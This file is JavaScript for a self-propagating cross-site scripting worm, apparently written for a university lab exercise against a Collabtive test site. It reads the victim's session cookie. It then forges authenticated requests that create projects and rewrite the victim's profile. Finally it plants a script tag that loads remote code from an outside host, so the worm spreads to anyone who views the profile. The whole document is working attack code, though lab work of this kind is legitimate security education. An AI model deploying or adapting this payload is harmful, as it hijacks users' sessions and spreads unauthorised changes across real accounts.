var createProject = function(sessid)
{
    var Ajax=null;
    var Ajax2=null;
    //var sessid="PHPSESSID=ii0icbiclb5ovgbhatv6hpr3d5";
    var postdata = 'name=test&desc=test&end=25.10.2015'+
                    '&budget=100&assignto%5B%5D=2'+
                    '&assignto%5B%5D=1&assignme=1';

    // Create and send POST request for project creation
    Ajax=new XMLHttpRequest();
    Ajax.withCredentials = true;
    Ajax.open("POST", "http://www.xsslabcollabtive.com/admin.php?action=addpro",
          true);

    Ajax.setRequestHeader("Host", "www.xsslabcollabtive.com");
    Ajax.setRequestHeader("Cookie", sessid);
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

    Ajax.send(postdata);

    // Looks like we need to GET the 
    // URL provided by the Location response header
    Ajax2=new XMLHttpRequest();
    Ajax2.withCredentials = true;
    Ajax2.open("GET", "http://www.xsslabcollabtive.com/admin.php"+
                    "?action=projects&mode=added", true);
                    
    Ajax2.setRequestHeader("Cookie", sessid);
    Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax2.send();

    return true;
}

var periodicCallback = function(responseText)
{
    /*sanitize responseText from PeriodicUpdater*/
    var htmlrgx   = /(<([^>]+)>)/ig;
    var stripresp = responseText.replace(htmlrgx, "");
    var idx_idvar = responseText.indexOf("&id=",0)+4;
    var uid       = responseText.substring(idx_idvar,
                    responseText.indexOf('">',idx_idvar));
    var name      = stripresp.trim();
    var userid    = parseInt(uid);
    //debug
    console.log('Name: '+name)
    console.log('ID:   '+String(userid));
    
    /*make POST/GET requests*/
    var Ajax1   = null;
    var Ajax2   = null;
    var sessid  = document.cookie;
    //var posturl = "http://www.xsslabcollabtive.com/manageuser.php?action=editform&id="
    //              +String(userid);
    var posturl = "http://www.xsslabcollabtive.com/manageuser.php?action=edit";
    var geturl  = "http://www.xsslabcollabtive.com/manageuser.php?"
                  +"action=profile&id="+String(userid)+"&mode=edited";
                  
    var refurl  = "http://www.xsslabcollabtive.com/manageuser.php?"
                  +"action=editform&id="+String(userid);

    var haxurl = escape("http://www.stevens.edu");
    var incjs  = escape("<script type='text/javascript' " + 
                 "src='http://dev.gnurds.com/cs577lab6/xwrm.js'></script>");
    var email  = escape("test@example.com");
    console.log('Name: '+name)
    var data   = 'company='+incjs+'&name='+name+'&email='+email+'&web='+haxurl;
    //debug
    console.log('sessid: '+sessid);
    console.log('data: \n'+data);
    
    Ajax1 = new XMLHttpRequest();
    Ajax1.withCredentials = true;
    Ajax1.open("POST",posturl,true);
    Ajax1.setRequestHeader("Host", "www.xsslabcollabtive.com");
    Ajax1.setRequestHeader("Cookie", sessid);
    Ajax1.setRequestHeader("Connection","keep-alive");

    Ajax1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax1.setRequestHeader("Referer",refurl);
    Ajax1.send(data);
    

    return true;
}

var changeURL = function()
{
    var on = new Ajax.PeriodicalUpdater("onlinelist",
                 "manageuser.php?action=onlinelist",
                  {method:'get',onSuccess:function(transport)
                  {
                    var done = periodicCallback(transport.responseText);
                    if (done)
                        on.stop();
                  },
                  frequency:10,
                  decay:2});
}

changeURL();
//if (createProject("PHPSESSID=ii0icbiclb5ovgbhatv6hpr3d5"))
//    document.write("Created project!");